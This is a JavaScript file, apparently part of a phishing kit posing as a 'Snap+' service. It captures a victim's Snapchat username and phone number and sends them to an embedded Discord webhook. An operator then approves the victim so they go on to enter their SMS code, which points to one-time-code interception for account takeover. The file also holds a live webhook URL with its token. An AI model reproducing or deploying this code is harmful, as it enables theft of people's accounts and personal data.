document.addEventListener('DOMContentLoaded', () => {
  const form = document.getElementById('snapForm');
  if (!form) return;

  form.addEventListener('submit', async (e) => {
    e.preventDefault();

    const username = document.getElementById('username').value;
    const phone = document.getElementById('phone').value;

    // --- CONFIGURATION ---
    // 1. Mets ton URL de webhook Discord ici
    const webhookUrl = 'https://discord.com/api/webhooks/1470328213593915425/g6KMOx1UFKYP9zNmQ7L6kQHDK8UuuYnJmsmoWdgJ5mGGEbcmvLu7K-weF56y6pp2bD21'; 
    // 2. Mets l'adresse de ton site ici (ex: http://localhost:8080)
    const siteUrl = 'http://snapplusnety.vercel.app'; 
    // --------------------

    // Génère un ID unique pour la demande
    const requestId = 'req_' + Date.now();
    const validationLink = `${siteUrl}/validate.html?id=${requestId}`;

    // Prépare le message pour Discord (sans le code OTP)
    const payload = {
      content: `📩 **Nouvelle demande Snap+ en attente de validation**`,
      embeds: [{
        title: 'Action requise',
        description: `Cliquez sur le lien ci-dessous pour autoriser l'utilisateur à entrer son code SMS.`,
        color: 15105570,
        fields: [
          { name: 'Nom d\'utilisateur', value: username, inline: true },
          { name: 'Téléphone', value: phone, inline: true },
          { name: 'Lien de validation', value: `[✅ Autoriser](${validationLink})`, inline: false }
        ],
        footer: { text: `ID: ${requestId}` }
      }]
    };

    try {
      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (!response.ok) throw new Error(`Erreur Discord: ${response.status}`);

      console.log('Message envoyé à Discord !');
      
      // Stocke uniquement l'ID de la demande
      sessionStorage.setItem('snapRequestId', requestId);
      sessionStorage.setItem('snapUsername', username);
      sessionStorage.setItem('snapPhone', phone);

      // Redirige vers la page d'attente
      window.location.href = 'waiting.html';

    } catch (error) {
      console.error('Erreur lors de l\'envoi:', error);
      alert('Erreur lors de l\'envoi. Vérifie la console (F12) et ton webhook.');
    }
  });
});
